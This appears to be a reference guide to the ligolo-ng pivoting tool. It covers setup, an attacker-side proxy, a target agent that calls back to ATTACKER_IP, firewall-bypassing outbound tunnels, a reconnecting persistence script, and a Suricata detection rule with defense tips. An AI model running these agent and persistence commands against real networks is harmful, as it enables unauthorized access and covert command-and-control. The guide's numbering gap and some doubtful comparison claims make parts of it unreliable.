---
title: "ligolo-ng - TUN Interface Tunneling"
description: "Advanced tunneling tool using TUN interfaces for VPN-like network pivoting without SOCKS proxies"
category: "tunneling"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
github: "https://github.com/nicocha30/ligolo-ng"
kali_install: "Download from GitHub releases"
version: "0.7"
---

# ligolo-ng

## Overview

ligolo-ng is a tunneling tool that creates a userland network stack using TUN interfaces. Unlike SOCKS-based tools, ligolo-ng provides a full VPN-like experience where traffic is routed through a TUN interface, allowing native network tools (nmap, curl, ssh) to work without proxychains. The agent runs without privileges on the target system.

ligolo-ng consists of two components: the proxy (run on the attacker's machine) and the agent (run on the target). The agent connects to the proxy and creates a bidirectional tunnel. The proxy creates a TUN interface and routes traffic through it to the agent, which forwards it to the target network.

The key advantage of ligolo-ng is that it works at the IP layer. Tools like nmap, curl, and ssh work directly without requiring proxychains or other proxy configuration. This makes it much easier to use than SOCKS-based tunneling tools.

## Chapter 1: Installation

### Download Binaries

```bash
# Proxy (attacker) - Linux
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_linux_amd64.tar.gz

# Agent (target) - Linux
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
tar xzf ligolo-ng_agent_linux_amd64.tar.gz

# Agent (target) - Windows
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_windows_amd64.zip
unzip ligolo-ng_agent_windows_amd64.zip
```

### Build from Source

```bash
# Build proxy
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng/proxy
go build -o proxy .

# Build agent
cd ../agent
go build -o agent .
```

### Verify Installation

```bash
./proxy -h
./agent -h
```

### Check Dependencies

```bash
# Proxy requires root for TUN interface
sudo ./proxy -h

# Agent runs without privileges
./agent -h
```

## Chapter 2: Basic Usage

### Start Proxy

```bash
sudo ./proxy -selfcert
```

**Explanation**: Starts the ligolo-ng proxy with a self-signed certificate. The proxy creates a TUN interface and listens for agent connections. The `-selfcert` flag auto-generates a certificate.

### Start Agent

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

**Explanation**: The agent connects to the proxy server. `-connect` specifies the proxy address, `-ignore-cert` accepts the self-signed certificate. The agent runs without privileges.

### Setup Interface

```bash
# On proxy (attacker)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Add route to target network
sudo ip route add 10.10.10.0/24 dev ligolo
```

**Explanation**: Creates a TUN interface and adds a route to the target network. Traffic to 10.10.10.0/24 is routed through the ligolo tunnel to the agent.

### Start Tunnel

```bash
# In ligolo-ng proxy console
proxy> session
ligolo-ng> start
```

**Explanation**: Starts the tunnel session. The agent begins forwarding traffic from the TUN interface.

## Chapter 3: Agent Connection

### Agent with Proxy

```bash
./agent -connect 192.168.1.100:11601 -ignore-cert
```

**Explanation**: Connects to the proxy at the specified IP and port. The agent maintains a persistent connection and tunnels traffic from the TUN interface.

### Agent with Let's Encrypt

```bash
./agent -connect proxy.example.com:443
```

**Explanation**: When the proxy uses a valid TLS certificate, the agent verifies it. This is more secure than using `-ignore-cert`.

### Agent with Custom Interface

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert -ifname myagent
```

**Explanation**: Sets a custom interface name for the agent. Useful when running multiple agents or when the default name conflicts.

### Agent with Custom ID

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert -id agent1
```

**Explanation**: Sets a custom identifier for the agent. Useful for distinguishing between multiple agents.

## Chapter 4: Network Configuration

### Proxy Side Setup

```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo

# Bring interface up
sudo ip link set ligolo up

# Add route to internal network
sudo ip route add 10.10.10.0/24 dev ligolo
```

**Explanation**: The TUN interface is the endpoint for the tunnel. Routes determine which traffic goes through the tunnel. Add routes for each internal network reachable through the agent.

### Agent Side Routes

```bash
# On proxy, add remote network
sudo ip route add 192.168.1.0/24 dev ligolo
```

**Explanation**: Routes on the proxy side determine which traffic is sent to the agent. The agent then forwards the traffic to the appropriate destination on its local network.

### Multiple Networks

```bash
# Add routes for multiple networks
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 10.10.20.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo
```

**Explanation**: Multiple routes can be added to reach different network segments through the same agent. Each route directs traffic for that subnet through the tunnel.

### Route Verification

```bash
# Check routes
ip route show

# Test connectivity
ping 10.10.10.1

# Check TUN interface
ip addr show ligolo
```

**Explanation**: Verify routes are correctly configured and traffic is flowing through the tunnel.

## Chapter 5: Interactive Commands

### Start Tunnel

```
proxy> session
ligolo-ng> start
```

**Explanation**: Starts the tunnel session. The agent begins forwarding traffic from the TUN interface.

### List Agents

```
proxy> session
```

**Explanation**: Lists all connected agents with their IDs, remote addresses, and status.

### Show Interface Configuration

```
ligolo-ng> ifconfig
```

**Explanation**: Shows the current network configuration of the tunnel interface.

### Stop Tunnel

```
ligolo-ng> stop
```

**Explanation**: Stops the current tunnel session. Traffic stops flowing through the tunnel.

### Switch Agent

```
proxy> session -i 2
```

**Explanation**: Switches to agent 2. Useful when multiple agents are connected.

## Chapter 6: Advanced Features

### Listener on Agent

```bash
# On proxy
ligolo-ng> listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
```

**Explanation**: Creates a listener on the proxy that forwards connections through the agent to the target. This is useful for accessing services on the target network from the proxy.

### UDP Listener

```bash
ligolo-ng> listener_add --addr 0.0.0.0:5353 --to 127.0.0.1:53 --udp
```

**Explanation**: Creates a UDP listener. UDP traffic is forwarded through the tunnel to the target.

### Reverse Connection

```bash
# Agent connects outbound (default)
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

**Explanation**: By default, the agent initiates the connection to the proxy. This bypasses inbound firewall rules on the target.

### WebSocket Support

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:443 -wss
```

**Explanation**: The proxy can listen on WebSocket for environments where only HTTP/HTTPS is allowed. The agent connects via WebSocket instead of raw TCP.

### Custom Certificate

```bash
sudo ./proxy -certfile cert.pem -keyfile key.pem
```

**Explanation**: Use a custom TLS certificate instead of auto-generated self-signed certificate. This provides proper certificate validation.

## Chapter 7: Performance

### Benchmark

```bash
# Through test (100+ Mbps typical)
iperf3 -c 10.10.0.1 -p 24483
```

**Explanation**: ligolo-ng achieves over 100 Mbps throughput due to its efficient userland network stack. This is significantly faster than SOCKS-based alternatives.

### Protocol Support

- **TCP**: Full support, SYN/ACK handling
- **UDP**: Full support with multiplexing
- **ICMP**: Echo requests (ping) supported

**Explanation**: ligolo-ng supports TCP, UDP, and ICMP protocols. TCP connections are handled with proper state tracking, UDP with multiplexing, and ICMP with echo request handling.

### Throughput Optimization

```bash
# Increase buffer sizes
sudo sysctl -w net.core.rmem_max=16777216
sudo sysctl -w net.core.wmem_max=16777216
```

**Explanation**: Adjust system buffer sizes for better throughput. These settings increase the maximum socket buffer sizes.

## Chapter 8: Operational Considerations

### Privileges

- **Proxy**: Requires root (for TUN interface creation)
- **Agent**: Runs without privileges

**Explanation**: The agent can run as any user, making it suitable for scenarios where root access is not available on the target system.

### Certificate Management

```bash
# Generate self-signed certificate
sudo ./proxy -selfcert -certfile cert.pem -keyfile key.pem

# Use custom certificate
sudo ./proxy -certfile cert.pem -keyfile key.pem
```

**Explanation**: The proxy uses TLS for all communications. Self-signed certificates are suitable for testing, while custom certificates provide proper validation.

### Multiple Agents

```bash
# Each agent gets its own session
./agent -connect ATTACKER_IP:11601 -ignore-cert -id agent1
./agent -connect ATTACKER_IP:11601 -ignore-cert -id agent2
```

**Explanation**: Multiple agents can connect to the same proxy, each providing access to different network segments. The operator can switch between agents to pivot through different networks.

### Agent Persistence

```bash
# Create startup script
cat << 'EOF' > /tmp/ligolo-agent.sh
#!/bin/bash
while true; do
    ./agent -connect ATTACKER_IP:11601 -ignore-cert
    sleep 5
done
EOF
chmod +x /tmp/ligolo-agent.sh
```

**Explanation**: Create a persistent agent that automatically reconnects if the connection drops.

## Chapter 9: Detection and Defense

### Network Signatures

- TLS connections to non-standard ports
- Unusual TUN interface creation
- High volume of traffic through single connection

### IDS/IPS Detection

```
# Suricata rule for ligolo-ng
alert tcp any any -> any 11601 (msg:"Ligolo-NG Agent Detected"; \
  flow:to_server,established; \
  content:"|16 03|"; \
  threshold:type both,track by_src, count 1, seconds 60; \
  sid:1000001; rev:1;)
```

### Log Analysis

```bash
# Monitor for TUN interface creation
ip link show type tun

# Check for unusual routes
ip route show | grep ligolo

# Review connection logs
ss -tnp | grep 11601
```

### Defense Recommendations

1. Monitor for TUN interface creation
2. Implement egress filtering
3. Use network segmentation
4. Monitor for unusual routes
5. Implement application-layer firewalls

## Chapter 10: Troubleshooting

### Connection Refused

```bash
# Check proxy is running
ps aux | grep proxy

# Check port is listening
ss -tlnp | grep 11601

# Check firewall rules
iptables -L -n | grep 11601
```

### TUN Interface Issues

```bash
# Check if TUN module is loaded
lsmod | grep tun

# Load if needed
sudo modprobe tun

# Check interface exists
ip link show ligolo
```

### Routing Issues

```bash
# Check routes
ip route show

# Add missing route
sudo ip route add 10.10.10.0/24 dev ligolo

# Test connectivity
ping 10.10.10.1
```

### Performance Issues

```bash
# Check MTU settings
ip link show ligolo | grep mtu

# Adjust MTU if needed
sudo ip link set ligolo mtu 1400

# Check buffer sizes
sysctl net.core.rmem_max
```

### Certificate Issues

```bash
# Verify certificate
openssl x509 -in cert.pem -text -noout

# Generate new certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 30 -out cert.pem
```

## Resources

- [ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [ligolo-ng Documentation](https://docs.ligolo.ng/)
- [Gvisor Userland Network Stack](https://gvisor.dev/)
- [Kali Linux ligolo-ng Page](https://www.kali.org/tools/ligolo-ng/)
- [MITRE ATT&CK - Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [MITRE ATT&CK - Proxy](https://attack.mitre.org/techniques/T1090/)
- [MITRE ATT&CK - Remote Access Software](https://attack.mitre.org/techniques/T1219/)

---

## Chapter 12: Comparison with Other Tunneling Tools

### Ligolo-ng vs Alternatives

| Feature | Ligolo-ng | Chisel | socat | ProxyChains |
|---|---|---|---|---|
| Protocol | TUN | TCP/HTTP | TCP/UDP | LD_PRELOAD |
| Privileges | Root (proxy only) | Root (both) | Root | Root |
| Proxychains Needed | No | Yes | Yes | N/A |
| Performance | High (100+ Mbps) | Medium | Medium | Medium |
| UDP Support | Yes | No | Yes | No |
| ICMP Support | Yes | No | No | No |
| Agent Privileges | None required | Root | Root | Root |

### When to Use Ligolo-ng

- Full network pivoting without proxychains
- High-throughput tunneling (100+ Mbps)
- UDP and ICMP traffic forwarding
- Multi-segment network access
- When agent privileges are limited

### When to Use Alternatives

- **Chisel**: When HTTP-based tunneling is needed
- **socat**: For simple TCP/UDP forwarding
- **ProxyChains**: When LD_PRELOAD hooking is acceptable
- **SSH**: For encrypted tunneling with built-in tools
